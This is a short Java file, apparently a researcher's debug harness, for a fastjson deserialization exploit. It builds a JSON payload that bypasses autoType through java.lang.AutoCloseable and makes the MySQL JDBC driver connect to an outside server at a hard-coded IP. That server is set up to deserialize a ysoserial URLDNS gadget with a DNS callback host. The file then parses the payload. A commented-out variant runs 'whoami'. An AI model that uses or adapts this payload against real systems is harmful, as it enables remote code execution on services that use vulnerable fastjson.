package com.sorry.bug;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.alibaba.fastjson.serializer.StringCodec;
import com.mysql.jdbc.JDBC4Connection;
import com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor;
import jdk.nashorn.api.scripting.URLReader;

import java.io.IOException;

/**
 * created by 0x22cb7139 on 2021/6/28
 */
public class Debug {
    public static void main(String[] args) throws IOException {

        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //利用AutoCloseablerable绕过autotype
        //String expStr="{\"a\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sorry.bug.customautocloseable\"},\"b\":{\"@type\":\"com.sorry.bug.customautocloseable\",\"command\":\"whoami\"}}";
        //利用Exception期望类绕过autotype
        String payload_mysqljdbc = "{\"aaa\":{" +
                "  \"@type\": \"java.lang.AutoCloseable\"," +
                "  \"@type\": \"com.mysql.jdbc.JDBC4Connection\"," +
                "  \"hostToConnectTo\": \"103.133.176.97\"," +
                "  \"portToConnectTo\": 3306," +
                "  \"info\": {" +
                "    \"user\": \"yso_URLDNS_http://ssrf.nn15f3.dxyvro.cdns.me/\"," +
                "    \"password\": \"pass\"," +
                "    \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\"," +
                "    \"autoDeserialize\": \"true\"," +
                "    \"NUM_HOSTS\": \"1\"," +
                "    \"maxAllowedPacket\": \"655360\" "+
                "  }," +
                "  \"databaseToConnectTo\": \"dbname\"," +
                "  \"url\": \"\"" +
                "}}";
        System.out.println(payload_mysqljdbc);
        JSON.parse(payload_mysqljdbc);
    }
}
